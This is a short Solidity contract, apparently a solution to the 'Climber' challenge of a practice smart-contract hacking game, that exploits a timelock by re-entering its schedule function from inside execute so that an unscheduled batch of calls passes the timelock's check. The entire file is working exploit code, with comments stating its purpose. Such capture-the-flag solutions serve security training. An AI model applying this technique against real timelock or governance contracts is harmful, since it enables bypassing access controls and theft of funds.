pragma solidity ^0.8.0;

import "../climber/ClimberTimelock.sol";

contract ClimberExp {
    constructor() {}

    function doSchedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external {

        ClimberTimelock climberTL = ClimberTimelock(payable(msg.sender));
        bytes[] memory de = new bytes[](4);

        for (uint i = 0; i < 3; i++) {
            de[i] = dataElements[i];
        }

        // add doSchedule task which is executed to call by this function to scheduled task list
        de[3] = abi.encodeWithSignature(
            "doSchedule(address[],uint256[],bytes[],bytes32)",
            targets,
            values,
            dataElements,
            salt
        );
        
        // exploit reentrancy to call schedule function before execute ends.
        climberTL.schedule(targets, values, de, salt);
    }
}